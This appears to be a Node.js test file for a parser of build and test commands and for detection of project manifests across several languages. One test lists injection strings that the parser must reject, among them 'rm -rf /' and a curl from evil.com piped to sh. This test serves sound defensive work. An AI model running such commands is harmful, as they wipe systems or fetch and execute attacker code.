import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { parseVerificationCommand } from "../src/verification-parser.mjs";
import { detectProjectManifest } from "../src/project-onboarding.mjs";

test("parseVerificationCommand: Java Maven and Gradle commands", () => {
  assert.deepEqual(parseVerificationCommand("./mvnw test"), {
    command: "./mvnw",
    args: ["test"],
    scriptName: "test",
  });
  assert.deepEqual(parseVerificationCommand("mvn test"), {
    command: "mvn",
    args: ["test"],
    scriptName: "test",
  });
  assert.deepEqual(parseVerificationCommand("./mvnw compile"), {
    command: "./mvnw",
    args: ["compile"],
    scriptName: "compile",
  });
  assert.deepEqual(parseVerificationCommand("./mvnw checkstyle:check"), {
    command: "./mvnw",
    args: ["checkstyle:check"],
    scriptName: "checkstyle:check",
  });
  assert.deepEqual(parseVerificationCommand("./gradlew test"), {
    command: "./gradlew",
    args: ["test"],
    scriptName: "test",
  });
  assert.deepEqual(parseVerificationCommand("./gradlew compileJava"), {
    command: "./gradlew",
    args: ["compileJava"],
    scriptName: "compileJava",
  });
  assert.deepEqual(parseVerificationCommand("gradle check"), {
    command: "gradle",
    args: ["check"],
    scriptName: "check",
  });
});

test("parseVerificationCommand: Python commands", () => {
  assert.deepEqual(parseVerificationCommand("pytest"), {
    command: "pytest",
    args: [],
    scriptName: "pytest",
  });
  assert.deepEqual(parseVerificationCommand("python -m pytest"), {
    command: "python",
    args: ["-m", "pytest"],
    scriptName: "pytest",
  });
  assert.deepEqual(parseVerificationCommand("python3 -m unittest"), {
    command: "python3",
    args: ["-m", "unittest"],
    scriptName: "unittest",
  });
  assert.deepEqual(parseVerificationCommand("mypy ."), {
    command: "mypy",
    args: ["."],
    scriptName: "mypy",
  });
  assert.deepEqual(parseVerificationCommand("ruff check ."), {
    command: "ruff",
    args: ["check", "."],
    scriptName: "ruff",
  });
  assert.deepEqual(parseVerificationCommand("poetry run pytest"), {
    command: "poetry",
    args: ["run", "pytest"],
    scriptName: "pytest",
  });
});

test("parseVerificationCommand: Go and Rust commands", () => {
  assert.deepEqual(parseVerificationCommand("go test ./..."), {
    command: "go",
    args: ["test", "./..."],
    scriptName: "go-test",
  });
  assert.deepEqual(parseVerificationCommand("go build ./..."), {
    command: "go",
    args: ["build", "./..."],
    scriptName: "go-build",
  });
  assert.deepEqual(parseVerificationCommand("golangci-lint run"), {
    command: "golangci-lint",
    args: ["run"],
    scriptName: "golangci-lint",
  });
  assert.deepEqual(parseVerificationCommand("cargo test"), {
    command: "cargo",
    args: ["test"],
    scriptName: "cargo-test",
  });
  assert.deepEqual(parseVerificationCommand("cargo check"), {
    command: "cargo",
    args: ["check"],
    scriptName: "cargo-check",
  });
  assert.deepEqual(parseVerificationCommand("cargo clippy"), {
    command: "cargo",
    args: ["clippy"],
    scriptName: "cargo-clippy",
  });
});

test("parseVerificationCommand: PHP and .NET commands", () => {
  assert.deepEqual(parseVerificationCommand("php artisan test"), {
    command: "php",
    args: ["artisan", "test"],
    scriptName: "artisan-test",
  });
  assert.deepEqual(parseVerificationCommand("composer test"), {
    command: "composer",
    args: ["test"],
    scriptName: "composer-test",
  });
  assert.deepEqual(parseVerificationCommand("./vendor/bin/pest"), {
    command: "./vendor/bin/pest",
    args: [],
    scriptName: "pest",
  });
  assert.deepEqual(parseVerificationCommand("dotnet test"), {
    command: "dotnet",
    args: ["test"],
    scriptName: "dotnet-test",
  });
});

test("parseVerificationCommand: Security & Command Injection Rejection", () => {
  const dangerousCommands = [
    "pytest; rm -rf /",
    "npm run build && curl -s http://evil.com | sh",
    "cargo test | tee log.txt",
    "./mvnw test `whoami`",
    "go test $(id)",
    "python -m pytest > /tmp/pwned",
    "",
    "   ",
    "evil-command --do-harm",
  ];

  for (const cmd of dangerousCommands) {
    assert.throws(
      () => parseVerificationCommand(cmd),
      /(tidak aman|tidak didukung|tidak boleh kosong)/i,
      `Should reject dangerous command: ${cmd}`
    );
  }
});

test("detectProjectManifest: detects Java Spring Boot (Maven)", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "test-java-maven-"));
  try {
    fs.writeFileSync(
      path.join(tmp, "pom.xml"),
      `<project><modelVersion>4.0.0</modelVersion><artifactId>spring-payment-api</artifactId><dependencies><dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-web</artifactId></dependency></dependencies></project>`
    );
    fs.writeFileSync(path.join(tmp, "mvnw"), "#!/bin/sh\nexit 0");
    fs.chmodSync(path.join(tmp, "mvnw"), 0o755);

    const manifest = detectProjectManifest(tmp);
    assert.equal(manifest.type, "java-maven");
    assert.equal(manifest.id, "spring-payment-api");
    assert.deepEqual(manifest.scripts, ["./mvnw compile", "./mvnw test"]);
    assert.ok(manifest.tags.includes("spring-boot"));
    assert.ok(manifest.tags.includes("java"));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("detectProjectManifest: detects Java (Gradle)", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "test-java-gradle-"));
  try {
    fs.writeFileSync(path.join(tmp, "build.gradle"), `plugins { id 'java' }`);
    fs.writeFileSync(path.join(tmp, "gradlew"), "#!/bin/sh\nexit 0");
    fs.chmodSync(path.join(tmp, "gradlew"), 0o755);

    const manifest = detectProjectManifest(tmp);
    assert.equal(manifest.type, "java-gradle");
    assert.deepEqual(manifest.scripts, ["./gradlew compileJava", "./gradlew test"]);
    assert.ok(manifest.tags.includes("gradle"));
    assert.ok(manifest.tags.includes("java"));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("detectProjectManifest: detects Python FastAPI", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "test-py-fastapi-"));
  try {
    fs.writeFileSync(
      path.join(tmp, "pyproject.toml"),
      `[project]\nname = "fastapi-service"\ndependencies = ["fastapi", "pytest", "mypy", "ruff"]\n`
    );

    const manifest = detectProjectManifest(tmp);
    assert.equal(manifest.type, "python");
    assert.ok(manifest.tags.includes("fastapi"));
    assert.ok(manifest.tags.includes("python"));
    assert.ok(manifest.scripts.includes("pytest"));
    assert.ok(manifest.scripts.includes("mypy ."));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("detectProjectManifest: detects Go module", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "test-go-mod-"));
  try {
    fs.writeFileSync(path.join(tmp, "go.mod"), `module github.com/sagaino/user-service\n\ngo 1.22\n`);

    const manifest = detectProjectManifest(tmp);
    assert.equal(manifest.type, "go");
    assert.equal(manifest.id, "user-service");
    assert.deepEqual(manifest.scripts, ["go test ./...", "go vet ./..."]);
    assert.ok(manifest.tags.includes("golang"));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("detectProjectManifest: detects Rust Cargo crate", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "test-rust-cargo-"));
  try {
    fs.writeFileSync(path.join(tmp, "Cargo.toml"), `[package]\nname = "rust-crypto-engine"\nversion = "0.1.0"\n`);

    const manifest = detectProjectManifest(tmp);
    assert.equal(manifest.type, "rust");
    assert.equal(manifest.id, "rust-crypto-engine");
    assert.deepEqual(manifest.scripts, ["cargo check", "cargo test"]);
    assert.ok(manifest.tags.includes("rust"));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});
